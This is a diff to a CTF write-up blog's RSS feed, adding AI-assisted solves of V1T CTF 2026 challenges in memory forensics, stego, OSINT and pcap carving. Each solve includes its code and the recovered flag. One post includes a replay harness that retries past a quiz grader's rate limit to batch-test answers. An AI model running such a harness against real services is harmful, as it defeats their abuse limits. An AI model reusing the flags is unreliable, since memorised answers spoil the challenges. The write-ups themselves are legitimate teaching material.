+<p>First I had the model triage the image. It confirmed Windows 11 build 26100 via <code>windows.info</code>, then diffed <code>pslist</code> against <code>psscan</code> — that exposed the decoy storm (24 <code>PING.EXE</code> spawned in a 23-second window, plus terminated <code>lsass</code>/<code>explorer</code> only visible to the pool scan). The model's instinct was to start grepping artifacts; I corrected course, because every noise routine stamps <code>N01S3_</code> and you drown. The right move, which I prompted explicitly, was: don't grep the dump, carve the binary and read the code that plants the artifacts.</p>
+<p>The model ran a <code>strings</code> sweep to find the dropper (<code>GreenGoblin.exe</code>, internal name &quot;GreenPlasma&quot;), located it with <code>windows.filescan</code>, dumped it with <code>windows.dumpfiles</code>, and — because the PE shipped with DWARF symbols — recovered function names in radare2. I asked it to isolate the real check from the decoys: <code>wmain</code> calls <code>GenerateNoise()</code> first, then five fixed-name routines (<code>GenerateRegistryArtifact</code>, <code>NtCreateSymbolicLinkObject</code>, <code>GenerateADSArtifact</code>, <code>GenerateEventLogArtifact</code>, <code>GenerateMemoryArtifact</code>). I had it disassemble each of the five and pull the fixed 6-byte value each writes. Noticing every byte sat in the printable <code>0x21–0x75</code> band and the noise marker <code>N01S3}</code> was itself leetspeak, I told it the encoding was ROT47, and verified the concatenation produced a clean flag.</p>
+<p>The five real fragments, in the given order R · KO · D · EL · M:</p>
 <table>
 <thead>
 <tr>
-<th>Theme</th>
-<th>Vibe</th>
+<th>Frag</th>
+<th>Mechanism</th>
+<th>Bytes (ASCII)</th>
+<th>ROT47</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td>amber</td>
-<td>warm phosphor (default)</td>
+<td>R</td>
+<td>Registry value <code>HKCU\...\CloudFiles\DiagnosticData</code></td>
+<td><code>'`%L`0</code></td>
+<td><code>V1T{1_</code></td>
 </tr>
 <tr>
-<td>green</td>
-<td>classic terminal</td>
+<td>KO</td>
+<td>Kernel object symlink → <code>\BaseNamedObjects\9cGb0c</code></td>
+<td><code>9cGb0c</code></td>
+<td><code>h4v3_4</code></td>
 </tr>
 <tr>
-<td>C64</td>
-<td>lavender retro</td>
+<td>D</td>
+<td>NTFS ADS <code>...\config.ini:hidden</code></td>
+<td><code>03`809</code></td>
+<td><code>_b1g_h</code></td>
 </tr>
 <tr>
-<td>LCD</td>
-<td>paper-sage</td>
+<td>EL</td>
+<td>Fake Application Error event, faulting-module path</td>
+<td><code>cC50C_</code></td>
+<td><code>4rd_r0</code></td>
+</tr>
+<tr>
+<td>M</td>
+<td>Named section <code>Local\9cGb0c</code> at <code>+0x250</code></td>
+<td><code>_dEbCN</code></td>
+<td><code>05t3r}</code></td>
 </tr>
 </tbody>
 </table>
-<p>Flip themes from the picker in the header — your choice persists in
-localStorage.</p>
-<p>73 de LazyBlog. Now go write something real.</p>
+<pre><code class="language-python">def rot47(s):
+    return ''.join(
+        chr(33 + (ord(c) - 33 + 47) % 94) if 33 &lt;= ord(c) &lt;= 126 else c
+        for c in s
+    )
+
+frags = {
+    'R':  &quot;'`%L`0&quot;,
+    'KO': &quot;9cGb0c&quot;,
+    'D':  &quot;03`809&quot;,
+    'EL': &quot;cC50C_&quot;,
+    'M':  &quot;_dEbCN&quot;,
+}
+
+flag = ''.join(rot47(frags[k]) for k in ['R', 'KO', 'D', 'EL', 'M'])
+print(flag)
+# V1T{1_h4v3_4_b1g_h4rd_r005t3r}
+</code></pre>
+<p>The difficulty was entirely separating signal from noise; the encoding was plain ROT47.</p>
+<h2 id="flag">Flag</h2>
+<pre><code>V1T{1_h4v3_4_b1g_h4rd_r005t3r}
+</code></pre>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>HVL</title>
+      <link>https://doantung99.github.io/blog/posts/hvl</link>
+      <guid isPermaLink="true">https://doantung99.github.io/blog/posts/hvl</guid>
+      <pubDate>Sun, 28 Jun 2026 00:00:00 +0700</pubDate>
+      <dc:creator>tungdlm99</dc:creator>
+      <category>ctf</category>
+      <category>v1t-ctf-2026</category>
+      <category>web</category>
+      <category>ai-assisted</category>
+      <description>A 'troll' GitHub Pages site hides the flag behind two stego layers; the real one is a substitution-cipher font that renders emoji lyrics as flag text.</description>
+      <content:encoded><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>hvl.v1t.site</code> is an MCK lyric visualizer that smuggles data two ways: invisible Unicode variation selectors (a decoy reading <code>hello sir</code>) and a custom <code>cmap</code> font that maps emoji codepoints to flag characters. The real solve is parsing that font's <code>cmap</code> to translate the emoji burst at the end of the subtitles.</p>
+<h2 id="solution">Solution</h2>
+<p>This was very much a &quot;me steering, model grinding&quot; solve. I recognized the duck/<code>haivl</code> naming as a troll signal and told the model to assume nothing on screen was the channel and to hunt for a hidden one.</p>
+<ol>
+<li><strong>Recon, model-driven.</strong> I had the model triage the site behind Cloudflare's managed challenge. It noticed <code>favicon.ico</code> returns GitHub's &quot;Page not found · GitHub Pages&quot; page, so I pointed it at GitHub: the source lives in the public repo <code>tommytheduck/hvl</code>, exposing <code>index.html</code>, the MP3, and a suspicious <code>NotoSans-Regular.ttf</code>.</li>
+<li><strong>Catching the decoy.</strong> The model first locked onto invisible variation selectors after the 🔥 in SRT cue #33 and proudly decoded <code>hello sir</code>. I flagged that as the troll and redirected it: that font is named &quot;Emoji To AZ&quot; internally, not Noto — so it's a substitution cipher, and the emoji captions are being <em>drawn</em> as letters.</li>
+<li><strong>Verify via the font.</strong> I asked it to script the <code>cmap</code> extraction with <code>fontTools</code>, map glyph names like <code>braceleft</code>/<code>one</code>/<code>underscore</code> to characters, and apply it to the emojis in the embedded SRT in order. I confirmed the output matched the on-theme flag (<code>g04t</code> = GOAT, <code>mck</code> = the artist, <code>hvl</code> = haivl).</li>
+</ol>
+<pre><code class="language-python">from fontTools.ttLib import TTFont
+import re
+
+font = TTFont(&quot;NotoSans-Regular.ttf&quot;)
+cmap = font.getBestCmap()  # codepoint -&gt; glyph name
+
+names = {'braceleft': '{', 'braceright': '}', 'underscore': '_',
+         'zero': '0', 'one': '1', 'two': '2', 'three': '3', 'four': '4',
+         'five': '5', 'six': '6', 'seven': '7', 'eight': '8', 'nine': '9'}
+
+def g2c(g):
+    return names.get(g, g)
+
+# emojis from the embedded SRT, in order
+html = open(&quot;index.html&quot;, encoding=&quot;utf-8&quot;).read()
+srt = re.search(r'const embeddedSrt = &quot;(.*?)&quot;;', html, re.S).group(1)
+srt = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), srt)
+
+flag = ''.join(g2c(cmap[ord(c)]) for c in srt
+               if ord(c) &gt;= 0x1F000 and ord(c) in cmap)
+print(flag)  # v1t{g04t_mck_hvl}
+</code></pre>
+<p>The intended &quot;aha&quot;: load the page to the end with the custom font and the emoji lines literally render the flag on screen.</p>
+<h2 id="flag">Flag</h2>
+<pre><code>v1t{g04t_mck_hvl}
+</code></pre>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Huh</title>
+      <link>https://doantung99.github.io/blog/posts/huh</link>
+      <guid isPermaLink="true">https://doantung99.github.io/blog/posts/huh</guid>
+      <pubDate>Sun, 28 Jun 2026 00:00:00 +0700</pubDate>
+      <dc:creator>tungdlm99</dc:creator>
+      <category>ctf</category>
+      <category>v1t-ctf-2026</category>
+      <category>misc</category>
+      <category>ai-assisted</category>
+      <description>A mixed OSINT/stego challenge where a Vietnamese village photo gives the flag prefix and a hidden text fragment gives the suffix.</description>
+      <content:encoded><![CDATA[<h2 id="summary">Summary</h2>
+<p>A hybrid OSINT/stego puzzle: one image points to an old Vietnamese village (Cự Đà), and a hidden text fragment inside the artifact supplies the tail of the flag. The win is reconstructing the full <code>v1t{...}</code> by pairing the location-derived prefix with the recovered suffix.</p>
+<h2 id="solution">Solution</h2>
+<p>I pegged this early as an OSINT-plus-stego combo and set that as the direction for the model: treat the picture and the hidden data as two halves of one flag, not two separate puzzles. That framing mattered, because the suffix alone looks like a complete flag and it's tempting to just submit it.</p>
+<ol>
+<li>I handed the image to the model and prompted it to geolocate by architectural and cultural cues rather than generic landmarks, steering it toward &quot;old Vietnamese village&quot; instead of a tourist spot. It converged on <strong>Cự Đà village</strong>, which normalizes to the leetspeak prefix <code>cu_d4</code>.</li>
+<li>Separately, I had the model extract the hidden text fragment from the artifact. It pulled out <code>_c4non_f4nboy}</code> — clearly a flag suffix, not a whole flag. I caught the trap here: I told it not to submit the fragment standalone and to instead splice it onto the OSINT prefix.</li>
+<li>I verified the join by hand. The model did the grinding (geolocation reasoning, stego extraction, normalization); my job was the prompting and the judgment call that the two pieces were one flag.</li>
+</ol>
+<pre><code class="language-python"># Two recovered halves, assembled into one flag.
+osint_prefix = &quot;cu_d4&quot;          # Cự Đà village, leetspeak-normalized (from the image)
+stego_suffix = &quot;_c4non_f4nboy}&quot; # hidden text fragment recovered from the artifact
+
+flag = &quot;v1t{&quot; + osint_prefix + stego_suffix
+print(flag)  # -&gt; v1t{cu_d4_c4non_f4nboy}
+</code></pre>
+<h2 id="flag">Flag</h2>
+<pre><code>v1t{cu_d4_c4non_f4nboy}
+</code></pre>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Kaspersky</title>
+      <link>https://doantung99.github.io/blog/posts/kaspersky</link>
+      <guid isPermaLink="true">https://doantung99.github.io/blog/posts/kaspersky</guid>
+      <pubDate>Sun, 28 Jun 2026 00:00:00 +0700</pubDate>
+      <dc:creator>tungdlm99</dc:creator>
+      <category>ctf</category>
+      <category>v1t-ctf-2026</category>
+      <category>osint</category>
+      <category>ai-assisted</category>
+      <description>A 5-question Kaspersky / Kaspersky Academy OSINT quiz at kaspersky.v1t.site, industrialized by scripting the grader's API — and the final question only accepted the course title in its native Cyrillic, not any romanization.</description>
+      <content:encoded><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>kaspersky.v1t.site</code> is a linear 5-question OSINT quiz on Kaspersky / Kaspersky Academy — file metadata, course curricula, an archived social repost, and a Foursquare check-in badge. Validation is server-side but scriptable, so I had the model build a replay harness to batch-test answers; the last question only accepted the course's <strong>native Cyrillic</strong> title, <code>Кибергигиена</code>.</p>
+<h2 id="solution">Solution</h2>
+<p>I split this into two problems and let the model do the legwork on both: turn the grader into a cheap oracle, then grind five OSINT sub-puzzles against it. My job was reading each question's <em>real</em> intent (metadata vs. page text, on-domain vs. off-domain, English vs. Cyrillic) and killing wrong hypotheses fast.</p>
+<h3 id="step-1-make-the-grader-scriptable">Step 1 — Make the grader scriptable</h3>
+<p>I had the model reverse the SPA's inline script and it surfaced a clean API: <code>POST /api/start</code> → <code>{token, question}</code>, <code>POST /api/answer {token, answer}</code> → <code>Correct.</code> + next token (Q1–Q4) or <code>Completed.</code> + <code>flag</code> (Q5). The base64 token carries a wrong-counter, but in practice the only limiter was a burst rate limit (HTTP 429) — so I told the model to build a replay harness with a ~250 ms delay + retry-on-429, which lets us re-mint a Q5 token by replaying Q1–Q4 and batch-test candidates.</p>
+<h3 id="step-2-the-five-answers-and-how-i-steered-each">Step 2 — The five answers (and how I steered each)</h3>
+<ul>
+<li><strong>Q1 — &quot;modified date of the Advanced Membership file&quot;:</strong> I flagged &quot;<em>of the file</em>&quot; as a metadata steer, not the page's publish date. Had the model check the <code>Last-Modified</code> header / PDF <code>ModDate</code> on the Kaspersky Academy Alliance Program doc → <strong><code>10/04/2025</code></strong>.</li>
+<li><strong>Q2 — who led &quot;Malware Reverse Engineering&quot;:</strong> the live SPA only credits Victor Chebyshev; I had the model pull the curriculum PDF + Wayback capture, which adds Boris Larin → <strong><code>VictorChebyshev_BorisLarin</code></strong>. (This also fingerprinted &quot;instructor data lives in curriculum docs&quot; — a fact I had to <em>not</em> over-trust in Q5.)</li>
+<li><strong>Q3 — Aug 3 2017 reposted album → registration link:</strong> I insisted the link was off-domain (the format hint <code>example.com/abcxyz</code> was literal). Wayback of the Academy Twitter timeline → the event's <strong><code>surveymonkey.com/r/Z8M9C2D</code></strong> (every kaspersky.com / Starmus / JunctionX guess was rejected — JunctionX didn't even exist until 2018).</li>
+<li><strong>Q4 — man who visited the fitness room 50+ times:</strong> &quot;50+ times&quot; = a Foursquare/Swarm badge. The model found the <strong>Kaspersky Lab Gym</strong> venue, hit Foursquare's auth wall, so I logged in (passwordless email code) and read the Tips — only <strong><code>DimmChern</code></strong> carries &quot;Been here 50+ times&quot;.</li>
+<li><strong>Q5 — the course with 5 instructors (3M/2F):</strong> see below.</li>
+</ul>
+<h3 id="step-3-q5-answer-in-the-source-s-native-script">Step 3 — Q5: answer in the source's native script</h3>
+<p>The model identified the course almost immediately: on the <strong>Russian-locale</strong> API (<code>domainType=1</code>) exactly one course returns 5 speakers, 3 male / 2 female — <code>cyberhygiene</code> / <strong><code>Кибергигиена</code></strong> (the English page shows 8, which doesn't match). The trap was the <em>spelling</em>: ~200 English/transliterated forms (<code>Cyberhygiene</code>, <code>Kibergigiena</code>, <code>Kaspersky_Cyber_Hygiene</code>, …) were all rejected, and I briefly over-generalized Q2's &quot;data lives in PDFs&quot; insight into a long, useless Wayback/SOCKS5 PDF hunt. The fix was simple once I trusted the live API: the grader stores the <strong>literal Cyrillic title</strong> from the Russian page. The format hint <code>(Kaspersky_Next_EDR_Optimum)</code> only meant &quot;underscore-join multiple words&quot; — a one-word Cyrillic title needs neither.</p>
+<pre><code class="language-js">// Replay harness: mint a fresh token, answer Q1-Q4, then submit each Q5 candidate.
+// Run on the kaspersky.v1t.site origin (browser console / Playwright evaluate).
+const KNOWN = [&quot;10/04/2025&quot;, &quot;VictorChebyshev_BorisLarin&quot;,
+               &quot;surveymonkey.com/r/Z8M9C2D&quot;, &quot;DimmChern&quot;];
+const Q5 = [&quot;Кибергигиена&quot;,            // &lt;- native Cyrillic title (the winner)
+            &quot;CyberHygiene&quot;, &quot;cyber_hygiene&quot;, &quot;Kiberhigiena&quot;, &quot;Kaspersky_Cyberhygiene&quot;];
+const sleep = ms =&gt; new Promise(r =&gt; setTimeout(r, ms));
+
+async function post(path, body) {
+  for (;;) {                                   // retry on 429 rate limit
+    const r = await fetch(path, {method:&quot;POST&quot;, headers:{&quot;Content-Type&quot;:&quot;application/json&quot;},
+                                 body: JSON.stringify(body)});
+    if (r.status === 429) { await sleep(800); continue; }
+    return r.json();
+  }
+}
+for (const cand of Q5) {
+  let { token } = await post(&quot;/api/start&quot;, {});
+  for (const a of KNOWN) {                      // replay Q1-Q4 to reach Q5
+    const res = await post(&quot;/api/answer&quot;, {token, answer: a}); token = res.token; await sleep(250);
+  }
+  const res = await post(&quot;/api/answer&quot;, {token, answer: cand});
+  await sleep(250);
+  if (res.flag) { console.log(&quot;FLAG via&quot;, cand, &quot;-&gt;&quot;, res.flag); break; }
+}
+</code></pre>
+<p><code>Кибергигиена</code> returned <code>{&quot;message&quot;:&quot;Completed.&quot;,&quot;flag&quot;:&quot;v1t{kaspersky_pls_collabbb}&quot;}</code> on the first try — 5/5.</p>
+<h2 id="flag">Flag</h2>
+<pre><code>v1t{kaspersky_pls_collabbb}
+</code></pre>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>New Way to store my CP</title>
+      <link>https://doantung99.github.io/blog/posts/new-way-to-store-my-cp</link>
+      <guid isPermaLink="true">https://doantung99.github.io/blog/posts/new-way-to-store-my-cp</guid>
+      <pubDate>Sun, 28 Jun 2026 00:00:00 +0700</pubDate>
+      <dc:creator>tungdlm99</dc:creator>
+      <category>ctf</category>
+      <category>v1t-ctf-2026</category>
+      <category>misc</category>
+      <category>ai-assisted</category>
+      <description>A near-empty Pastebin hid a StegCloak password, and a YouTube video was actually a yt-media-storage container whose packets had to be block-reconstructed, Wirehair-repaired, and XChaCha20-decrypted to reveal the flag.</description>
+      <content:encoded><![CDATA[<h2 id="summary">Summary</h2>
+<p>A Pastebin with an &quot;empty&quot; message hid invisible Unicode characters that StegCloak decoded into a password, and the linked YouTube video turned out to be a <code>yt-media-storage</code> file container that needed packet recovery, Wirehair fountain-code repair, and XChaCha20-Poly1305 decryption. My job was steering: I called the technique at each fork, fed artifacts to the model, and corrected it when a naive decode failed; the model did the reversing, scripting, and decoding grind.</p>
+<h2 id="solution">Solution</h2>
+<p><strong>Step 1 — the &quot;new cloak&quot; tell.</strong> I gave the model the Pastebin text and the line <code>MY &lt;looks empty&gt; NEW CLOAK HEHEHE</code>. I recognized &quot;new cloak&quot; as the StegCloak signature and steered it that way rather than chasing visual stego. I had it dump every non-ASCII codepoint to confirm a hidden payload, and the output was full of zero-width characters (<code>⁡</code>, <code>⁢</code>, <code>⁣</code>, <code>⁤</code>, <code>‌</code>, <code>‍</code>). Then <code>stegcloak reveal -f '899yXPGK (1).txt'</code> gave the password/clue <code>5h0ut_0ut_t0_Brandon</code>.</p>
+<p><strong>Step 2 — interpret the clue, then catch the wrong turn.</strong> I asked the model to OSINT &quot;Brandon&quot; against &quot;storing files in YouTube videos.&quot; It landed on Brandon Li / PulseBeat02 and the project <code>PulseBeat02/yt-media-storage</code> — a tool that packs arbitrary files into video frames as <code>SFTY</code>-magic packets with Wirehair redundancy and optional XChaCha20-Poly1305 encryption. The model's first instinct was a straight <code>media_storage decode</code> of the supplied MP4. I had it try, it was unreliable, and I made the call on why: the file was a 1080p YouTube re-encode, so pixel-perfect packet extraction was lost. I redirected it to reconstruct bits from visual blocks instead of single pixels.</p>
+<p><strong>Step 3 — block-level recovery, repair, decrypt.</strong> I had the model extract frames, sample each block back into bits, keep only packets matching the <code>SFTY</code> header/checksum, and feed them to Wirehair (one source block was missing but repair packets covered it). The recovered 120223-byte blob decrypted with the StegCloak password into <code>Quack</code>-filler text. I told it the flag prefix was likely split by filler, and a search around the middle confirmed it. End-to-end:</p>
+<pre><code class="language-python">from pathlib import Path
+from PIL import Image
+# pip install pillow ; npm install -g stegcloak
+# yt-media-storage helpers (PulseBeat02): wirehair_repair, xchacha20_decrypt
+
+# 1) StegCloak password (run separately, captured here):
+#    stegcloak reveal -f '899yXPGK (1).txt'  -&gt;  5h0ut_0ut_t0_Brandon
+PASSWORD = &quot;5h0ut_0ut_t0_Brandon&quot;
+VIDEO = &quot;YTDown_YouTube_I-store-my-CP-here_Media_hLX0Igh-DKg_001_1080p.mp4&quot;
+
+# 2) extract frames:  ffmpeg -i $VIDEO frames/f%04d.png
+# 3) block-level packet recovery (1080p re-encode =&gt; sample blocks, not pixels)
+valid = []
+for fp in sorted(Path(&quot;frames&quot;).glob(&quot;f*.png&quot;)):
+    img = Image.open(fp).convert(&quot;RGB&quot;)
+    bits = []
+    for y in range(0, img.height, 8):
+        for x in range(0, img.width, 8):
+            block = list(img.crop((x, y, x + 8, y + 8)).getdata())
+            avg = tuple(sum(p[i] for p in block) // len(block) for i in range(3))
+            bits.append(recover_bit_from_average_rgb(avg))   # palette threshold
+    data = bits_to_bytes(bits)
+    for pkt in split_possible_packets(data):
+        if pkt.startswith(b&quot;SFTY&quot;) and checksum_ok(pkt):
+            valid.append(pkt)
+
+# 4) Wirehair repair -&gt; encrypted chunk -&gt; XChaCha20-Poly1305 decrypt
+chunk = wirehair_repair(valid)                 # rebuilds the one missing block
+plain = xchacha20_decrypt(chunk, PASSWORD)     # 120223 bytes of Quack filler
+Path(&quot;decrypted_output.bin&quot;).write_bytes(plain)
+
+# 5) flag prefix is split by &quot;Quack&quot; filler -&gt; find the first 'V'
+s = plain.decode(errors=&quot;replace&quot;)
+i = s.find(&quot;V&quot;)
+print(s[i:i + 120])   # V Quack 1 Quack T{Quack_Quack_Quack_1_l0ve_Qu4cking_r34l_much_br}
+print(&quot;&quot;.join(s[i:i + 120].split(&quot; Quack &quot;)))   # collapse filler -&gt; flag
+</code></pre>
+<p>The recovered region read <code>V Quack 1 Quack T{Quack_Quack_Quack_1_l0ve_Qu4cking_r34l_much_br}</code>; collapsing the <code>Quack</code> filler between the prefix letters yields the flag.</p>
+<h2 id="flag">Flag</h2>
+<pre><code>V1T{Quack_Quack_Quack_1_l0ve_Qu4cking_r34l_much_br}
+</code></pre>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Polar Fragments</title>
+      <link>https://doantung99.github.io/blog/posts/polar-fragments</link>
+      <guid isPermaLink="true">https://doantung99.github.io/blog/posts/polar-fragments</guid>
+      <pubDate>Sun, 28 Jun 2026 00:00:00 +0700</pubDate>
+      <dc:creator>tungdlm99</dc:creator>
+      <category>ctf</category>
+      <category>v1t-ctf-2026</category>
+      <category>forensics</category>
+      <category>ai-assisted</category>
+      <description>A multi-source forensics challenge where each of five pcaps exfiltrates one flag fragment over a different protocol (HTTP/FTP/SMTP/chunked HTTP), and the fragments are low-contrast text hidden inside carried images and documents.</description>
+      <content:encoded><![CDATA[<h2 id="summary">Summary</h2>
+<p>The drop was a 10 GiB E01 disk image, a <code>locked.zip</code>, and five 224 MB pcapng captures. Each pcap smuggles exactly one flag fragment through a different protocol and file format, buried under decoy traffic; the disk image and zip are pure narrative. The core technique is per-protocol carrier identification, then reading low-contrast text out of the carried images/docs.</p>
+<h2 id="solution">Solution</h2>
+<p>I went in assuming &quot;reconstruct what was hidden&quot; meant the captures were the real target and the bulky disk image was a time sink, so I set that direction first and had the model confirm it by triaging the artifacts: it flagged <code>Bob/Desktop/flag.txt</code> (fake <code>V1t{th1s_1s_n0t...}</code>), a planted <code>v1t{</code>+garbage blob inside <code>Alice/Pictures/photo_48.jpg</code>, a steg-bait PNG, and an uncrackable OpenSSL-encrypted <code>secret.txt.enc</code> — all decoys. I told it to drop the E01 and <code>locked.zip</code> and focus on the pcaps.</p>
+<p>Then I had it grind through the captures. My steering was: grep the raw pcap bytes for base64 file magics (<code>/9j/</code>, <code>iVBORw0</code>, <code>JVBER</code>) and force HTTP dissection on odd ports, then identify the carrier per pcap. It mapped four real fragments to four protocols (pcap5 is a decoy stream):</p>
+<ol>
+<li><strong>HTTP</strong> <code>POST /api/data</code> (UA <code>python-requests</code>) carrying a 400×200 PNG → <code>1c3_</code></li>
+<li><strong>FTP</strong> <code>STOR secret_data.bin</code>, a base64 PDF with <code>(b34r_)Tj</code> in the content stream → <code>b34r_</code></li>
+<li><strong>SMTP</strong> (tcp.stream 2653), base64 MIME <code>.docx</code> attachment with run <code>15_</code> → <code>15_</code></li>
+<li><strong>Chunked HTTP</strong> <code>POST /api/chunk</code> (UA <code>ChunkSender/1.0</code>) reassembled to a JPEG → <code>cu73?}</code></li>
+</ol>
+<p>Pcap4 was the trap and where I had to correct the model's first pass: it tried to reassemble the first chunked stream it saw, but there are <strong>9</strong> chunked transfers to 9 <code>host:port</code> pairs and eight are high-entropy decoys. I told it to use entropy to separate them — the one real, low-entropy JPEG is the 7-chunk transfer to <code>172.20.0.50:7777</code>. After that it ordered chunks on <code>X-Chunk-Index</code> and the carried files all decoded cleanly. The fragment images are low-contrast text on white, so the last step is auto-contrast + upscale to read the characters; I verified each fragment by eye before concatenating.</p>
+<pre><code class="language-python">import base64
+from PIL import Image, ImageOps
+
+# --- pcap4: reassemble the real JPEG (7-chunk stream to 172.20.0.50:7777) ---
+# chunk_bodies_in_index_order = base64 chunk bodies sorted by X-Chunk-Index
+img = base64.b64decode(b''.join(chunk_bodies_in_index_order))
+open('frag4.jpg', 'wb').write(img)
+
+# --- read low-contrast fragment images (e.g. the PNG from pcap1) ---
+def read_fragment(path, out):
+    im = ImageOps.autocontrast(Image.open(path).convert('L')).resize((1600, 800))
+    im.save(out)
+
+read_fragment('frag1.png', 'frag1_big.png')   # -&gt; v1t{1c3_
+# frag2 (b34r_) from FTP PDF, frag3 (15_) from SMTP .docx, frag4 (cu73?}) from frag4.jpg
+
+# --- assemble ---
+flag = '1c3_' + 'b34r_' + '15_' + 'cu73?}'
+print('v1t{' + flag)   # leading v1t{ is rendered in fragment 1's image
+</code></pre>
+<h2 id="flag">Flag</h2>
+<pre><code>v1t{1c3_b34r_15_cu73?}
+</code></pre>
 ]]></content:encoded>
     </item>
   </channel>
